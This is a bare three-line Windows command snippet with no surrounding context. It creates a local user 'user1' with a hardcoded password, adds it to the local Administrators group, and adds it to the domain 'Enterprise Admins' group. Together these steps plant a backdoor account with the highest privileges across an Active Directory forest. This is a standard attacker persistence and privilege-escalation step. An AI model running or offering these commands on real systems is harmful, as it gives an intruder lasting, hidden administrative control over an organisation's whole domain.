net user /add user1 Password12345!
net localgroup administrators user1 /add
net group "Enterprise Admins" user1 /add
